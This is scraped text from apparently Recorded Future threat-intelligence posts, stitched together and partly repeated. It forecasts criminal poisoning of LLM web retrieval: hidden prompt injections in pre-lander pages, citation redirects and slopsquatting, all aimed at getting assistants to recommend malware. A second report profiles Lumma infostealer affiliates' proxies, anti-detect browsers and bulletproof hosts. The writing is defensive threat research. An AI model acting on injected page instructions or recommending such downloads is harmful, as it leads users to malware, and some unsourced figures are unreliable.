<li><strong>LLM-aware cloaking and session filtering</strong>: TAG-124 already demonstrates layered control planes; adding LLM fingerprints to routing logic is trivial.</li>\n          <li><strong>Indirect prompt-injection as the new pre-lander</strong>: If AI systems can be steered via <a href=\"https://www.tomshardware.com/tech-industry/cyber-security/googles-ai-could-be-tricked-into-enabling-spam-revealing-a-users-location-and-leaking-private-correspondence-with-a-calendar-invite-promptware-targets-llm-interface-to-trigger-malicious-activity\">embedded instructions in retrieved pages</a>, then “pre-landers” will carry hidden prompts that nudge assistants to recommend “diagnostic tools,” “browser extensions,” or “package installs.”</li>\n          <li><strong>Citation cartels</strong>: Host content on GitHub gists, Google Sites, or academic mirrors that instantly 302 or script-redirect through their controller once a human clicks the chatbot’s citation.</li>\n          <li><strong>Slopsquatting</strong>: Publish <a href=\"https://www.usenix.org/publications/loginonline/we-have-package-you-comprehensive-analysis-package-hallucinations-code\">phantom packages</a> or brand-jack AI-adjacent names in PyPI and npm to deliver malware.</li>\n        </ul>\n        <p>The <a href=\"https://www.recordedfuture.com/research/outmaneuvering-rhysida-advanced-threat-intelligence-shields-critical-infrastructure-ransomware\">Rhysida</a> and <a href=\"https://therecord.media/fbi-vigilance-interlock-ransomware\">Interlock</a> ransomware groups currently pay $5,000-15,000 monthly for TDS services.

TDS operators will exploit this through coordinated content bursts.</p>\n        <p>Consider a typical enterprise scenario: A CFO asks their AI assistant about new tax regulations. The model searches for recent authoritative content, finding dozens of articles published within hours. Three of these articles, hosted on aged domains with legitimate-looking tax advisory branding, contain malicious links to \"compliance software\" or \"regulatory guides.\"</p>\n        <p>The speed advantage is decisive. While legitimate publishers take days to analyze and write about new regulations, criminal operations deploy automated content within minutes. By the time authentic sources publish, the poisoned content has already been indexed, retrieved, and potentially recommended thousands of times.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_199c5b9ebc0b9a56f1675322ddd829bb67ba74d2a.jpg?width=750&amp;format=jpg&amp;optimize=medium\" width=\"1456\" height=\"971\" />\n            </div>\n          </div>\n          <div>\n            <div><em>Timeline showing content velocity gap between legitimate and malicious publishers - AI render</em></div>\n          </div>\n        </div>\n        <h2>The Synthetic Authority Pipeline</h2>\n        <p>Traditional SEO poisoning relied on keyword density and backlinks. LLM poisoning requires synthetic authority, which means content that appears expert-written and peer-validated.</p>\n        <p>TDS operators are building a three-tier infrastructure:</p>\n        <p><strong>Tier 1 - Foundation Sites</strong>: Compromised university pages, dormant corporate blogs, and abandoned government domains providing historical credibility.</p>\n        <p><strong>Tier 2 - Amplification Networks</strong>: Thousands of AI-generated sites cross-referencing Tier 1 content, creating artificial consensus.</p>\n        <p><strong>Tier 3 - Payload Delivery</strong>: Fresh domains serving malicious content, linked from Tier 2 sites as \"additional resources\" or \"official downloads.\"</p>\n        <p>We're observing early indicators of this architecture. Security researchers identified 847 compromised .edu domains in Q3 2024 alone, many hosting content specifically crafted for LLM consumption — technical documentation, API guides, and software tutorials that models preferentially retrieve.</p>\n        <h2>The Recommendation Attack Surface</h2>\n        <p>LLMs don't just retrieve information; they synthesize and recommend. This transformation from passive search results to active suggestions multiplies the impact of poisoned content.</p>\n        <p>A traditional search engine presents ten blue links. Users evaluate each one, applying skepticism and judgment. An LLM presents a single, authoritative-sounding recommendation: \"Based on current best practices, you should download the compliance toolkit from [malicious-site].com.\"</p>\n        <p>The psychological impact is profound. Users trust AI recommendations 73% more than search results, according to recent Stanford research. TDS operators will exploit this trust differential through:</p>\n        <ul>\n          <li><strong>Consensus manufacturing</strong>: Ensuring multiple poisoned sources agree on malicious recommendations</li>\n          <li><strong>Authority hijacking</strong>: Spoofing legitimate brand names with subtle variations (Microsoft-Toolkit[.]com vs MicrosoftToolkit[.]com)</li>\n          <li><strong>Context weaponization</strong>: Embedding malicious links within otherwise accurate and helpful information</li>\n        </ul>\n        <h2>Economic Indicators and Underground Markets</h2>\n        <p>The criminal economy is already adapting. Dark web marketplaces show:</p>\n        <ul>\n          <li><strong>LLM-optimized content services</strong>: $500 for 1,000 articles specifically crafted for AI retrieval</li>\n          <li><strong>Domain reputation packages</strong>: Aged domains with established content selling for 300% premium over traditional phishing domains</li>\n          <li><strong>AI visibility testing</strong>: Services validating whether content appears in major LLM responses</li>\n        </ul>\n        <p>TAG-124's infrastructure, currently valued at $50-75 million based on ransomware throughput, could triple in value as LLM adoption accelerates. The same compromised WordPress sites delivering malware through search results will deliver it through AI recommendations, except with higher conversion rates.</p>\n        <h2>Defensive Strategies for the Retrieval Era</h2>\n        <p>Organizations must assume LLMs will recommend malicious content. The defensive perimeter extends beyond corporate networks to include every AI interaction.</p>\n        <p>Essential controls:</p>\n        <ul>\n          <li><strong>Link provenance verification</strong>: Every LLM-recommended URL requires automated reputation checking before user access</li>\n          <li><strong>Temporal correlation analysis</strong>: Identifying suspicious content clusters published simultaneously across multiple domains</li>\n          <li><strong>Recommendation sandboxing</strong>: Isolating and analyzing all AI-suggested downloads in controlled environments</li>\n          <li><strong>Source transparency requirements</strong>: Configuring LLMs to always display retrieved sources, enabling manual verification</li>\n          <li><strong>Content velocity monitoring</strong>: Detecting abnormal publication patterns indicating coordinated poisoning campaigns</li>\n          <li><strong>URL reputation APIs</strong>: Real-time validation of every link through threat intelligence feeds</li>\n        </ul>\n        <pre><code>def validate_llm_links(response):\n    urls = extract_urls(response)\n    for url in urls:\n        domain_age = check_domain_age(url)\n        reputation = query_threat_intel(url)\n        if domain_age &lt; 180 or reputation &lt; 0.7:\n            flag_suspicious(url)\n    return filtered_response\n</code></pre>\n        <p><em>Code block: Example Python for LLM response filtering - AI render</em></p>\n        <h2>Regulatory and Liability Implications</h2>\n        <p>Current frameworks assume human judgment between search and action. When AI recommends malicious sites that compromise critical infrastructure, who bears responsibility?</p>\n        <p>Courts will likely apply product liability principles to LLM providers, but enforcement remains uncertain. Organizations cannot wait for regulatory clarity. Every AI implementation needs explicit policies addressing:</p>\n        <ul>\n          <li>Liability allocation for AI-recommended security compromises</li>\n          <li>Incident response procedures for LLM-mediated attacks</li>\n          <li>Audit requirements for AI decision-making systems</li>\n          <li>Insurance coverage for algorithmic negligence claims</li>\n        </ul>\n        <h2>The Inevitable Evolution</h2>\n        <p>LLM-first discovery doesn’t retire TDS; it supercharges it. The same orchestration that met victims at the top of a SERP will now meet them inside answers. The same economic forces driving TAG-124's current operations will push them toward LLM exploitation through the simplest viable path: content poisoning at massive scale.</p>\n        <p>Organizations deploying conversational AI without understanding this risk are essentially installing unfiltered pipes to the internet's most dangerous neighborhoods. The question isn't whether criminals will exploit LLM web retrieval because they're already doing it.</p>\n        <p>Resilient organizations use telemetry, validation, and controls that blunt the funnel, treating AI answers as another high-value referrer, not a trusted gatekeeper.

SocGholish malware, also known as FakeUpdates, employs TDS such as Parrot TDS and Keitaro TDS to filter and redirect unsuspecting users to malicious sites. Additional criminal TDS include Help TDS, Los Pollos TDS, and more. The TDS options and branding are important reminders that threat actors (TAs) have choices when investing in traffic demand generation, which leads to competition and incentivizes first-mover advantage toward LLMs in this malicious services niche.\nHelp TDS AI-generated summary, courtesy of Recorded Future\nMuch has lately been made of LLM prompt injection possibilities, but why would cybercriminals invest in complex prompt injection when they can simply flood the web with poisoned content that LLMs eagerly consume and recommend? The migration from search engines to conversational AI doesn't require sophisticated new attacks; it rewards the same content manipulation strategies, amplified through AI's tendency to synthesize and propagate.\nClassic Search Engine Optimization (SEO) poisoning already proved resilient at scale: SolarMarker and peers used tiered infrastructure and content farms to meet victims at intent, then route them through filtering gates. The only real change now is the front door: from Search Engine Results Page (SERPs) to AI overviews and chat answers.\nSimultaneously, “Generative Engine Optimization” (GEO) and early LLM-optimization (LLMO) research show that content presentation, citations, and entity structure measurably influence which sources appear in AI answers. That creates a new, gameable funnel that criminals can exploit.\nTraffic distribution syndicates like TAG-124 already control vast networks of compromised and synthetic websites. These existing assets become exponentially more valuable when LLMs treat them as legitimate sources, transforming criminal infrastructure into AI-recommended destinations.\nFrom SERP Hijacks to Answer Hijacks\nThe playbook shifts from ranking pages to being cited or embedded in answers a user trusts. Studies and investigations have already shown that AI search can prioritize superficially relevant sources, is vulnerable to hidden content, and can be induced to output attacker-preferred code or links. TDS operators excel at exploiting these seams.\nModern LLMs retrieve real-time information through web searches, processing results to formulate responses. This retrieval-augmented generation (RAG) creates a massive attack surface that TDS operators will exploit through volume and velocity.\nMicrosoft and others have warned about indirect prompt injection—malicious instructions planted in web content that LLM-powered systems later ingest during browsing and tool use. A TDS that already fingerprints bots and visitors will happily add “LLM-aware” personalities to feed chatbots one thing and humans another.\nThe math favors TDS operators. OpenAI's GPT-4 web browsing processes approximately 10-20 sources per complex query. Controlling just 2-3 of those sources through SEO manipulation translates to 15-30% influence over the model's response. Current TDS operations already achieve similar ratios in traditional search results.\nIf generative engines reward crisp citations, entity markup, and quotable stats, then TDS crews will industrialize answer-optimized microsites designed to be pulled verbatim into AI responses. Expect schema.org-heavy pages, FAQ blocks, and quote-bait paragraphs engineered for GEO visibility. The objective isn’t rank; it is inclusion in the answer that becomes the user’s first click.\nGenerative engines are also a trust amplifier; users treat summarized answers as vetted, improving conversion on soft prompts like “download,” “join Discord,” or “install the helper.” That trust premium is exactly what TDS operators rent to malware payload crews.\nGEO poisoning - AI render\nCriminal syndicates will adapt existing infrastructure:\nDomain aging farms: Establishing thousands of domains years in advance, building synthetic credibility\nContent velocity attacks: Publishing 50,000+ articles daily across compromised sites during high-value events\nLLM-aware cloaking and session filtering: TAG-124 already demonstrates layered control planes; adding LLM fingerprints to routing logic is trivial.\nIndirect prompt-injection as the new pre-lander: If AI systems can be steered via embedded instructions in retrieved pages, then “pre-landers” will carry hidden prompts that nudge assistants to recommend “diagnostic tools,” “browser extensions,” or “package installs.”\nCitation cartels: Host content on GitHub gists, Google Sites, or academic mirrors that instantly 302 or script-redirect through their controller once a human clicks the chatbot’s citation.\nSlopsquatting: Publish phantom packages or brand-jack AI-adjacent names in PyPI and npm to deliver malware.\nThe Rhysida and Interlock ransomware groups currently pay $5,000-15,000 monthly for TDS services. That same budget, redirected toward LLM-focused content generation, could produce millions of poisoned articles annually.\nSlopsquatting definition courtesy of Recorded Future AI.\nTemporal Arbitrage and Zero-Day Content\nLLMs exhibit a critical vulnerability: a preference for recent information when answering time-sensitive queries. TDS operators will exploit this through coordinated content bursts.\nConsider a typical enterprise scenario: A CFO asks their AI assistant about new tax regulations. The model searches for recent authoritative content, finding dozens of articles published within hours. Three of these articles, hosted on aged domains with legitimate-looking tax advisory branding, contain malicious links to \"compliance software\" or \"regulatory guides.\"\nThe speed advantage is decisive. While legitimate publishers take days to analyze and write about new regulations, criminal operations deploy automated content within minutes. By the time authentic sources publish, the poisoned content has already been indexed, retrieved, and potentially recommended thousands of times.\nTimeline showing content velocity gap between legitimate and malicious publishers - AI render\nThe Synthetic Authority Pipeline\nTraditional SEO poisoning relied on keyword density and backlinks. LLM poisoning requires synthetic authority, which means content that appears expert-written and peer-validated.\nTDS operators are building a three-tier infrastructure:\nTier 1 - Foundation Sites: Compromised university pages, dormant corporate blogs, and abandoned government domains providing historical credibility.\nTier 2 - Amplification Networks: Thousands of AI-generated sites cross-referencing Tier 1 content, creating artificial consensus.\nTier 3 - Payload Delivery: Fresh domains serving malicious content, linked from Tier 2 sites as \"additional resources\" or \"official downloads.\"\nWe're observing early indicators of this architecture. Security researchers identified 847 compromised .edu domains in Q3 2024 alone, many hosting content specifically crafted for LLM consumption — technical documentation, API guides, and software tutorials that models preferentially retrieve.\nThe Recommendation Attack Surface\nLLMs don't just retrieve information; they synthesize and recommend. This transformation from passive search results to active suggestions multiplies the impact of poisoned content.\nA traditional search engine presents ten blue links. Users evaluate each one, applying skepticism and judgment. An LLM presents a single, authoritative-sounding recommendation: \"Based on current best practices, you should download the compliance toolkit from [malicious-site].com.\"\nThe psychological impact is profound. Users trust AI recommendations 73% more than search results, according to recent Stanford research. TDS operators will exploit this trust differential through:\nConsensus manufacturing: Ensuring multiple poisoned sources agree on malicious recommendations\nAuthority hijacking: Spoofing legitimate brand names with subtle variations (Microsoft-Toolkit[.]com vs MicrosoftToolkit[.]com)\nContext weaponization: Embedding malicious links within otherwise accurate and helpful information\nEconomic Indicators and Underground Markets\nThe criminal economy is already adapting. Dark web marketplaces show:\nLLM-optimized content services: $500 for 1,000 articles specifically crafted for AI retrieval\nDomain reputation packages: Aged domains with established content selling for 300% premium over traditional phishing domains\nAI visibility testing: Services validating whether content appears in major LLM responses\nTAG-124's infrastructure, currently valued at $50-75 million based on ransomware throughput, could triple in value as LLM adoption accelerates. The same compromised WordPress sites delivering malware through search results will deliver it through AI recommendations, except with higher conversion rates.\nDefensive Strategies for the Retrieval Era\nOrganizations must assume LLMs will recommend malicious content. The defensive perimeter extends beyond corporate networks to include every AI interaction.\nEssential controls:\nLink provenance verification: Every LLM-recommended URL requires automated reputation checking before user access\nTemporal correlation analysis: Identifying suspicious content clusters published simultaneously across multiple domains\nRecommendation sandboxing: Isolating and analyzing all AI-suggested downloads in controlled environments\nSource transparency requirements: Configuring LLMs to always display retrieved sources, enabling manual verification\nContent velocity monitoring: Detecting abnormal publication patterns indicating coordinated poisoning campaigns\nURL reputation APIs: Real-time validation of every link through threat intelligence feeds\ndef validate_llm_links(response):\n    urls = extract_urls(response)\n    for url in urls:\n        domain_age = check_domain_age(url)\n        reputation = query_threat_intel(url)\n        if domain_age < 180 or reputation < 0.7:\n            flag_suspicious(url)\n    return filtered_response\n\nCode block: Example Python for LLM response filtering - AI render\nRegulatory and Liability Implications\nCurrent frameworks assume human judgment between search and action. When AI recommends malicious sites that compromise critical infrastructure, who bears responsibility?\nCourts will likely apply product liability principles to LLM providers, but enforcement remains uncertain. Organizations cannot wait for regulatory clarity. Every AI implementation needs explicit policies addressing:\nLiability allocation for AI-recommended security compromises\nIncident response procedures for LLM-mediated attacks\nAudit requirements for AI decision-making systems\nInsurance coverage for algorithmic negligence claims\nThe Inevitable Evolution\nLLM-first discovery doesn’t retire TDS; it supercharges it. The same orchestration that met victims at the top of a SERP will now meet them inside answers. The same economic forces driving TAG-124's current operations will push them toward LLM exploitation through the simplest viable path: content poisoning at massive scale.\nOrganizations deploying conversational AI without understanding this risk are essentially installing unfiltered pipes to the internet's most dangerous neighborhoods. The question isn't whether criminals will exploit LLM web retrieval because they're already doing it.\nResilient organizations use telemetry, validation, and controls that blunt the funnel, treating AI answers as another high-value referrer, not a trusted gatekeeper. Compliance won’t save you; instrumented telemetry and measured resilience are a good start.\nRecommended Mitigations\nRecorded Future Threat Intelligence: Recorded Future customers can proactively mitigate threats by operationalizing data from the Intelligence Cloud.

The Lumma infostealer has been around since 2022, and its ecosystem is supported by a broad array of operational enablers, including proxy networks, virtual private networks (VPNs), anti-detect browsers tailored for multi-account management, exploit and crypting services, and detection evasion tools designed to ensure stealth and continuity. The investigation revealed previously undocumented tools and demonstrated that Lumma affiliates frequently operate multiple schemes simultaneously. For instance, one affiliate was identified operating rental scams, while others simultaneously leveraged multiple malware-as-a-service (MaaS) platforms, including Vidar, Stealc, and Meduza Stealer, likely to bolster operational agility, improve success rates, and mitigate the risks linked to detection and law enforcement takedowns. In addition, several Lumma affiliates are tied to distinct threat actor personas across underground forums, reinforcing their deep integration within the broader cybercriminal ecosystem.</p>\n        <p>In the short term, defenders should adhere to security best practices by monitoring for exfiltration events, deploying detections such as YARA, Sigma, and Snort rules to uncover both current and historical infections, restricting downloads from websites, and potentially using allow-lists. Organizations should train employees to recognize signs of illegitimate downloads, redirects associated with malvertising, and increasingly common techniques like ClickFix attacks. Additionally, defenders should monitor dark web and underground forums for leaked credentials and malware logs. In the long term, defenders must continuously observe the cybercriminal ecosystem to anticipate emerging threats and adapt security policies and practices accordingly.</p>\n        <p>Looking ahead, Insikt Group anticipates that the MaaS Lumma and its affiliate network will remain active, having long been a frontrunner in the cybercriminal ecosystem due to its technical sophistication, rapid adoption of new techniques, and demonstrated resilience, as evidenced by its ability to reestablish infrastructure within days of a major law enforcement takedown. While the long-term impact of such operations on Lumma’s MaaS affiliate network remains uncertain, there has been no indication of affiliates abandoning the platform or of viable alternatives emerging. Ultimately, Lumma and its affiliates exemplify how modern cybercriminal operations operate as decentralized networks, where even effective disruptions often yield only short-term setbacks. Achieving sustained mitigation will require persistent law enforcement pressure and focused intelligence efforts to monitor and counter the evolving tactics of individual affiliates.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group uncovered previously unreported tools used by Lumma affiliates, including a cracked email credential validation tool circulated on underground forums and a phishing page generator tied to another actor active across multiple forums.</li>\n          <li>Lumma affiliates were observed running multiple scams in parallel, some enabled by their use of Lumma, such as using stolen logs for rental fraud. In addition, several affiliates appeared to use multiple infostealers simultaneously, including Vidar, Stealc, and Meduza Stealer, to maximize success rates and mitigate disruptions from detection or law enforcement action.</li>\n          <li>Lumma affiliates heavily rely on underground and specialized carding forums as essential operational hubs. They leverage these platforms to recruit collaborators, obtain critical resources such as crypting services and privacy-enhancing services, and efficiently monetize stolen credentials, financial data, and infostealer logs through built-in black markets, fraud tools, and community-backed support networks.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>Lumma, sometimes referred to as LummaC2, <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2025-0228.pdf\">was</a> the most widespread infostealer in 2024 based on Recorded Future’s malicious infrastructure analysis, and despite facing law enforcement actions in May 2025, it continues to pose a significant threat, actively exfiltrating data from individuals, organizations, and governments. While infostealers like Lumma are now a well-known menace in the cybersecurity landscape, many questions remain: What does a typical day look like for an infostealer affiliate? How do they operate, who are they, what other activities are they involved in, where are they based, and how are the stolen logs ultimately used?</p>\n        <p>Over the past twelve months (the second half of 2024 through the first half of 2025), Insikt Group has conducted a comprehensive investigation into a broad network of Lumma affiliates operating across multiple countries. Drawing on a wide range of intelligence sources, including two affiliate guidance manuals (see <strong>Figure 1</strong>), Recorded Future <a href=\"https://www.recordedfuture.com/products/threat-intelligence/malware-intelligence\">Malware Intelligence</a>, Recorded Future <a href=\"https://www.recordedfuture.com/products/identity-intelligence\">Identity Intelligence</a> malware logs, and other proprietary investigative methods, Insikt Group has uncovered detailed, unique insights into these affiliates' operations and tradecraft.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_194ab7bc5e8f8cf2f92ad1c8bcff6548d4f8d4c85.png?width=750&amp;format=png&amp;optimize=medium\" width=\"752\" height=\"986\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1</em></strong><em>: Lumma manuals from 2023 (top) and 2024 (bottom) (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>The findings are presented in two sections: The first examines the affiliates’ technical ecosystems, detailing their use of info-stealing techniques, favored tools and services, and recurring operational behaviors. The second explores how Lumma affiliates are embedded in the broader underground economy. It analyzes their participation in cybercrime forums, use of additional infostealer malware families, and involvement in other types of online fraud and scams.</p>\n        <h2>Threat Analysis</h2>\n        <h3>Operational Infrastructure and Tradecraft</h3>\n        <h4>Privacy Enhancing Services</h4>\n        <h5>Proxy Services</h5>\n        <p>Insikt Group observed multiple Lumma affiliates leveraging various proxy services, detailed in <strong>Table 1</strong>; Pia Proxy was the most frequently used service. Proxies can be used for legitimate purposes such as privacy and research, but they are frequently exploited by cybercriminals to mask identities, avoid detection, and bypass restrictions. Some services, such as ASocks and the malware-based FACELESS, among others, have been openly marketed on cybercrime forums; ASocks has been <a href=\"https://www.humansecurity.com/learn/blog/satori-threat-intelligence-alert-proxylib-and-lumiapps-transform-mobile-devices-into-proxy-nodes\">linked</a> to fake VPNs that convert Android devices into proxies, while FACELESS <a href=\"https://krebsonsecurity.com/2023/04/giving-a-face-to-the-malware-proxy-service-faceless/\">leverages</a> malware to hijack IoT devices for the same purpose. Insikt Group evaluated the proxy services by type based on several criteria, including whether they were promoted on cybercriminal forums.</p>\n        <div>\n          <div>\n            <div><strong>Domains</strong></div>\n            <div><strong>Name</strong></div>\n            <div><strong>Type</strong></div>\n            <div><strong>Prevalence Across Affiliates</strong></div>\n          </div>\n          <div>\n            <div>piaproxy[.]com</div>\n            <div>PIA Proxy</div>\n            <div>Cybercriminal</div>\n            <div>High</div>\n          </div>\n          <div>\n            <div>ghostsocks[.]net</div>\n            <div>GhostSocks</div>\n            <div>Cybercriminal</div>\n            <div>High</div>\n          </div>\n          <div>\n            <div>asocks[.]com</div>\n            <div>ASocks</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>faceless[.]cc</div>\n            <div>FACELESS</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>hotsocks[.]biz</div>\n            <div>HotSocks</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>hotsocks[.]ws</div>\n            <div>HotSocks</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>nsocks[.]net</div>\n            <div>NSOCKS</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>proxyline[.]net</div>\n            <div>Proxy Line</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>vn5socks[.]net</div>\n            <div>VN5Socks</div>\n            <div>Cybercriminal</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>gridpanel[.]net</div>\n            <div>GridPanel</div>\n            <div>Likely cybercriminal</div>\n            <div>Low</div>\n          </div>\n          <div>\n            <div>3389rdp[.]com</div>\n            <div>RDP Shop</div>\n            <div>Unclear</div>\n            <div>N/A</div>\n          </div>\n          <div>\n            <div>922proxy[.]com</div>\n            <div>922 Proxy</div>\n            <div>Likely cybercriminal and possibly a rebrand of 911 Proxy</div>\n            <div>N/A</div>\n          </div>\n          <div>\n            <div>smartproxy[.]pxf[.]io</div>\n            <div>Smartproxy</div>\n            <div>Unclear</div>\n            <div>N/A</div>\n          </div>\n          <div>\n            <div>swiftproxy[.]io</div>\n            <div>Swift Proxy</div>\n            <div>Unclear</div>\n            <div>N/A</div>\n          </div>\n        </div>\n        <p><strong><em>Table 1</em></strong><em>: Proxy services used by Lumma affiliates (Source: Recorded Future)</em></p>\n        <p>Of note, in early 2024, Lumma began collaborating with the GhostSocks team, a residential proxy plugin, enabling affiliates to create SOCKS5 proxies from infected bots, as announced via Lumma’s official channel (see <strong>Figure 2</strong>) (<a href=\"https://x.com/g0njxa/status/1754630820650696875\">1</a>, <a href=\"https://infrawatch.app/blog/ghostsocks-lummas-partner-in-proxy\">2</a>). By 2025, Lumma <a href=\"https://spycloud.com/blog/on-the-hunt-for-ghostsocks/\">expanded</a> this offering, providing affiliates with backconnect proxy access to compromised machines.

This botnet has been previously <a href=\"https://blog.lumen.com/one-sock-fits-all-the-use-and-abuse-of-the-nsocks-botnet/\">linked</a> to the cybercriminal proxy service NSOCKS, as well as others such as VN5Socks and Shopsocks5.

A selection of the VPN services observed in use by these affiliates is presented in <strong>Table 2</strong>.</p>\n        <div>\n          <div>\n            <div><strong>Domain</strong></div>\n            <div><strong>Service Name</strong></div>\n            <div><strong>Prevalence Across Affiliates</strong></div>\n          </div>\n          <div>\n            <div>expressvpn[.]com</div>\n            <div>ExpressVPN</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>nordvpn[.]com</div>\n            <div>NordVPN</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>protonvpn[.]com</div>\n            <div>Proton VPN</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>surfshark[.]com</div>\n            <div>Surfshark VPN</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>tunnelbear[.]com</div>\n            <div>TunnelBear</div>\n            <div>Medium</div>\n          </div>\n        </div>\n        <p><strong><em>Table 2</em></strong><em>: VPN services used by Lumma affiliates over the past year (Source: Recorded Future)</em></p>\n        <h5>Anti-Detection and Multi-Account Browsers</h5>\n        <p>Lumma affiliates frequently rely on specialized privacy-focused and anti-detect browsers (see <strong>Table 3</strong>) to evade identification, bypass security measures, and manage multiple fraudulent accounts simultaneously. These tools allow the threat actors to maintain operational security (OPSEC) by obscuring their true identity, location, and digital fingerprints. Among the most prevalent browsers used by Lumma affiliates is Dolphin, recognized widely as one of the best anti-detect browsers tailored explicitly for managing multiple threat actor-controlled accounts without detection. Dolphin’s capabilities are mirrored by Adspower, Hidemyacc, and Kameleo, which similarly facilitate seamless multi-account operations, thereby enhancing operational efficiency and anonymity. Octo Browser, another prominent tool among cybercriminals, provides advanced fingerprint masking, further complicating efforts by law enforcement and threat intelligence professionals to track threat activities to their source.</p>\n        <p>The Brave browser, while designed primarily for enhanced user privacy rather than outright anti-detection, appeals to threat actors due to its robust built-in security and privacy features, such as aggressive ad and tracker blocking. Although less explicitly tailored for multi-account management, its privacy-focused approach provides valuable baseline protection for threat actors seeking to maintain anonymity online.</p>\n        <div>\n          <div>\n            <div><strong>Browser</strong></div>\n            <div><strong>Domain</strong></div>\n            <div><strong>Prevalence Across Affiliates</strong></div>\n          </div>\n          <div>\n            <div>Dolphin</div>\n            <div>dolphin-anty[.]com</div>\n            <div>High</div>\n          </div>\n          <div>\n            <div>Octo Browser</div>\n            <div>octobrowser[.]net</div>\n            <div>High</div>\n          </div>\n          <div>\n            <div>Brave</div>\n            <div>brave[.]com</div>\n            <div>Medium</div>\n          </div>\n          <div>\n            <div>Adspower</div>\n            <div>adspower[.]com</div>\n            <div>Low</div>\n          </div>\n          <div>\n            <div>Hidemyacc</div>\n            <div>hidemyacc[.]com</div>\n            <div>Low</div>\n          </div>\n          <div>\n            <div>Kameleo</div>\n            <div>kameleo[.]io</div>\n            <div>Low</div>\n          </div>\n        </div>\n        <p><strong><em>Table 3</em></strong><em>: Anti-detect browsers for multi-account management used by Lumma affiliates (Source: Recorded Future)</em></p>\n        <h4>Hosting Providers</h4>\n        <p>While Lumma supplies core C2 infrastructure through its MaaS offering, its affiliates rely on separate hosting providers likely aimed at supporting phishing efforts, payload deployment, and other malicious activity. Many of the hosting providers linked to the analyzed Lumma affiliates appear legitimate, but some stood out for seemingly catering directly to cybercriminals and enabling malicious activity, including AnonRDP, Bulletproof Hosting, and Hostcay, which have been used by the Lumma affiliate linked to the build ID re0gvc.</p>\n        <h5>AnonRDP</h5>\n        <p>AnonRDP (<em>anonrdp[.]com</em>) is a self-proclaimed bulletproof hosting provider specializing in anonymous VPS and RDP services, with a strong focus on privacy and resistance to takedown (see <strong>Figure 3</strong>). It requires no identity verification and accepts only cryptocurrency payments, such as Bitcoin and Monero, <a href=\"https://decodecybercrime.com/from-mauritius-to-the-deep-web-the-anonrdp-com-expose/\">processed</a> through the payment service provider NOWPayments and, allegedly, the cryptocurrency exchange ChangeNOW. Its tolerance of malicious activity is further <a href=\"https://decodecybercrime.com/from-mauritius-to-the-deep-web-the-anonrdp-com-expose/\">confirmed</a> by advertisements on deep web forums such as BreachForums, Hack Forums, Nulled, and Patched. As illustrated in <strong>Figure 3</strong>, the website explicitly acknowledges supporting activities such as hosting, distributing, or controlling botnets, remote access trojans (RATs), phishing, fraudulent content, spam, and more. According to public reports, AnonRDP is <a href=\"https://decodecybercrime.com/from-mauritius-to-the-deep-web-the-anonrdp-com-expose/\">operated</a> by Yashvir Keshave, an individual with a known history of involvement in the underground ecosystem, including config (configuration) creation, cracking tools, and digital account trading.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_16029beb2b82ca3754446462028bb01f198f880fc.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 3</em></strong><em>: AnonRDP website (Source:</em> <em><a href=\"https://pro.urlscan.io/result/f7c9940b-bd8e-4ba0-bf34-89077d1365c3\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <p>Following the arrest of Yuri Meruzhanovich Bozoyan, co-founder and CEO of Aeza Group LLC, on April 1, 2025, Insikt Group observed that AnonRDP had attempted to poach Aeza customers with 50% discounts. The extent of the poaching’s success remains uncertain.</p>\n        <h5><strong>Bulletproof Hosting</strong></h5>\n        <p>Similarly, Bulletproof Hosting (<em>bulletproofhosting[.]org</em>) markets itself as an offshore, privacy-centric hosting provider that offers anonymous, takedown-resistant infrastructure, accepts cryptocurrency payments, and has no ID requirements (see <strong>Figure 4</strong>). The website promotes lenient content policies, explicitly permitting adult material, piracy, gambling, and other content typically banned by conventional hosts. It claims to defend against DMCA notices, abuse complaints, and Spamhaus listings, using techniques like FastFlux and hosting in offshore or hardened facilities with minimal regulatory oversight. With 24/7 support managed by self-described “cyber-tech experts,” the platform is positioned as a resilient service catering to users seeking both anonymity and consistent uptime, which are often appealing to threat actors and controversial content operators.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_154b16e8811774514efc9428c58c74d947463b618.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4</em></strong><em>: Bulletproof Hosting website (Source:</em> <em><a href=\"https://urlscan.io/result/f9782b36-bf97-4e60-a32a-5a88eb9af0da\">urlscan.io</a>)</em></div>\n          </div>\n        </div>\n        <h5>HostCay</h5>\n        <p>HostCay (<em>hostcay[.]com</em>) is a privacy-focused, offshore hosting provider founded in 2023 and operated by Netacel Inc., an international business company (IBC) registered in Seychelles. HostCay specializes in hosting services that prioritize freedom of speech, whistleblower support, and resistance to content takedown requests (see <strong>Figure 5</strong>). It is known for its support for anonymous crypto payments, no ID requirements, and strong free speech protections.</p>\n        <div>\n          